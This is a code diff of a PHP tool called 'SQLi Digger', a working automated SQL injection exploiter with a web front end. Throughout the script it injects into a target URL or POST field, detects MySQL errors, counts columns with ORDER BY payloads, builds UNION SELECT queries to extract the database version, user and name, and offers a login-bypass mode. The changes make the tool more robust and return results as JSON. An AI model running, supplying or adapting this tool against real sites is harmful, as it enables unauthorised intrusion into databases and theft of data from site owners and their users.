@@ -1,10 +1,11 @@
 <?
+error_reporting(E_ALL ^ E_NOTICE);
 //***** FIRST PARAMS
 $vulnerable=false;
 $post=false;
 $login_url=false;
 $default_error=false;
-$num_columns_limit=30;
+$num_columns_limit=40;
 $num_columns_start=15;
 $replace_key="%Inject_Here%";
 $default_delimiter='1135';
@@ -14,8 +15,11 @@ $_INJECTION=array(); //sqli information will be saved here
 echo'<pre>'; //testing
 //***********
 
+$last_fail=0;
+
 //************ FUNCTIONS ********* //
-function curl($url, $data = '', $isLogin = 0) {
+function curl($url, $data = '', $isLogin = 0) 
+{
     $ch = curl_init($url);
     $header = array();
     $header[0]  = "Accept: text/xml,application/xml,application/xhtml+xml,";
@@ -42,7 +46,8 @@ function curl($url, $data = '', $isLogin = 0) {
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     return curl_exec($ch);
 }
-function replace($method,$comilla='',$debug=false){
+function replace($method,$comilla='',$debug=false)
+{
     global $post,$post_vars,$url,$replace_key;
     if($comilla==''){$comilla=$replace_key;}
     //Replace %Inject_Here%(replace_key) with the requested query and execute it
@@ -68,7 +73,7 @@ function replace($method,$comilla='',$debug=false){
 }
 function get_info($affected_row=false,$command=false,$type=false,$coletilla=false){
     global $union_query,$default_delimiter,$default_fud,$fud_rows,$union_select,$_INJECTION;
-    if(!$affected_row || !$command){die('get_info() missing information');}
+    if(!$affected_row || !$command){para('get_info() missing information');}
 
     if($coletilla){
         $union_query=str_replace($union_select[$_INJECTION['method']]['coletilla'],$coletilla,$union_query);
@@ -80,7 +85,7 @@ function get_info($affected_row=false,$command=false,$type=false,$coletilla=fals
         $aio_request=str_replace(','.$affected_row.',',",concat_ws(0x7e,".$default_delimiter.",".$command.",".$default_delimiter."),",$union_query);
     }
     $content=filter(replace($aio_request),$default_delimiter.",".$command.",".$default_delimiter);
-    print_r($content);
+    //print_r($content);
     if(strpos($content,"$default_delimiter")!==false){
         $pre_content=explode($default_delimiter,$content);
 
@@ -119,24 +124,55 @@ function filter($content,$query,$to=false){
     }
     return $content;
 }
+function para($message)
+{
+    global $_INJECTION;
+	
+	$_INJECTION['message']=$message;
+	die(json_encode($_INJECTION));	
+}
 //************ FUNCTIONS ********* //
 
 
 
-if($_REQUEST['url']==''){
-    die('<center><form method="post" action="">
-<input style="width:500px;" name="url" id="url" onclick="check(this);" value="http://site.com/?id=2\'" type="text"><input value="Check" type="submit">
-<br>POST (optional):<input style="width:400px;" name="post" type="text"><br>
-login bypass?<select name="islogin" id="islogin"><option value="">no</option><option value="1">yes</option></select>
-</form></center>
-<script type="text/javascript">
-function check(url){
-    if(url.value=="http://site.com/?id=2\'")
-    {
-    url.value="";
-    }
-}
-</script>');
+if(!isset($_REQUEST['url']) || $_REQUEST['url']==''){
+?>
+<html>
+<head>
+	<title>SQLi Digger</title>
+	<style>
+	</style>
+</head>
+<body>
+	<center>
+		<h1>SQLi Digger</h1>
+		<input style="width:500px;" name="url" id="url" placeholder="http://site.com/?id=2\'" type="text"><button onclick="check();">Check</button>
+		<br><label>POST (optional):<input style="width:400px;" name="post" type="text"></label><br>
+		<label>login bypass?<select name="islogin" id="islogin"><option value="">no</option><option value="1">yes</option></select></label>
+	</center>
+	<div id="result">
+		
+	</div>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+	<script type="text/javascript">
+		function check()
+		{
+			var url=$('#url').val();
+			if(url==''){return false;}
+			$('#result').html('Checking site... May take a long time..');
+			
+			$.post('',{url:url},function (data){
+				
+				$('#result').html(data);
+				data=jQuery.parseJSON(data);								
+			})
+			.fail(function() { $('#result').html('Something went wrong'); });
+		}
+	</script>	
+</body>
+</html>	
+<?
+	die();
 }elseif($_REQUEST['post']!=''){
     $post=true;
     $post_vars=urldecode($_REQUEST['post']);
@@ -149,13 +185,13 @@ $url=urldecode($_REQUEST['url']);
 $checking_done=false;
 
 if(strpos($url,'http://')===false){
-    die('invalid url');
+    para('invalid url');
 }elseif(strpos($url,"'")===false && strpos($url,$replace_key)===false){
     if($post)
     {
         if(strpos($post_vars,"'")===false  && strpos($post_vars,$replace_key)===false)
         {
-            die('"\'" not found, ive recieved: '.$url);
+            para('"\'" not found, ive recieved: '.$url);
         }
         else
         {
@@ -165,7 +201,7 @@ if(strpos($url,'http://')===false){
             }
         }
     }else{
-        die('"\'" not found, ive recieved: '.$url);
+        para('"\'" not found, ive recieved: '.$url);
     }
 }
 if(!$checking_done){
@@ -222,7 +258,7 @@ $errors=array(
     "mysql_fetch_array()");
 
 //columns obtain methods
-$columns_method=array(0=>'%20order%20by%20-NUM---',1=>"%27%20order%20by%20-NUM---+");
+$columns_method=array(0=>'%20order%20by%20-NUM---',1=>"%20order%20by%20-NUM---+");
 
 //common errors for num colm success detection
 $columns_error=array(0=>'Unknown column');
@@ -255,7 +291,8 @@ if($login_url){
 }
 
 //Lets check if its vulnerable
-foreach($methods as $method){
+foreach($methods as $method)
+{
     $content=replace($method);
     foreach($errors as $error){
         if(strpos($content,$error)!==false){
@@ -266,8 +303,12 @@ foreach($methods as $method){
             break;
         }
     }
-
+	if($vulnerable){
+		 break;
+	}
 }
+
+
 
 if(!$vulnerable){
     /* Example
@@ -335,18 +376,19 @@ if(!$vulnerable){
         $i++;
     }
     if(!$vulnerable){
-        die('No injection found, safe :)');
+        para('No injection found, safe :)');
     }
 }
+
 
 // Now i continue or i stop?
 if($vulnerable){
 
     if($login_url){
-        die('It is! :( Usage:'.$default_method);
+        para('It is! :( Usage:'.$default_method);
     }else{
         //jump if its mysql error based
-        if($affected_row==''){
+        if(!isset($affected_row) || $affected_row==''){
             foreach($columns_method as $num_method=>$column_method){
 
                 //Check default column error message and decide method
@@ -358,9 +400,10 @@ if($vulnerable){
                     }
 
                 }
+				
 
                 //order by method should work
-                if($default_column_error!=''){
+                if(isset($default_column_error) && $default_column_error!=''){
 
                     $i=$num_columns_start;
                     $found=false;
@@ -380,8 +423,9 @@ if($vulnerable){
                         if($last_win!=0 && $last_fail!=0){
                             if($near==$last_fail){
                                 $num_columns=$last_win;
+								$_INJECTION['num_columns']=$num_columns;
                                 $found=true;
-                                //die('num columns:'.$num_columns);
+                                //para('num columns:'.$num_columns);
                                 break;
                             }
                         }
@@ -394,7 +438,7 @@ if($vulnerable){
             }
 
             // Lets build union all query
-            if($found){
+            if(isset($found) && $found){
 
                 $i=1;
                 $union_query=$union_select[$num_method]['union'];
@@ -432,13 +476,13 @@ if($vulnerable){
                     $i++;
                 }
                 if($affected_row==''){
-                    die('Couldnt find any column to show info');
+                    para('Couldnt find any column to show info');
                 }
 
             }
         }
         // Next step, trigger info
-        if($affected_row!=''){
+        if(isset($affected_row) && $affected_row!=''){
 
             //all in one petition for mysql<4.x
             $get_info=get_info($affected_row,"version(),user(),database()",1); // 1 means AIO
@@ -457,10 +501,10 @@ if($vulnerable){
                         if($get_info){
                             $host_info[$i]=$get_info;
                         }else{
-                            die('system failed obtaining '.$info.'. Affected row: '.$affected_row);
+                            para('system failed obtaining '.$info.'. Affected row: '.$affected_row);
                         }
                     }else{
-                        die('system failed obtaining '.$info.'. Affected row: '.$affected_row);
+                        para('system failed obtaining '.$info.'. Affected row: '.$affected_row);
                     }
                     $i++;
                 }
@@ -474,14 +518,12 @@ if($vulnerable){
             if($get_info){
                 print_r($get_info);
             }
-            die('end');
+            para('end');
         }
     }
 
 }else{
-    die(' safe :)');
+    para(' safe :)');
 }
-
-
 
 ?>
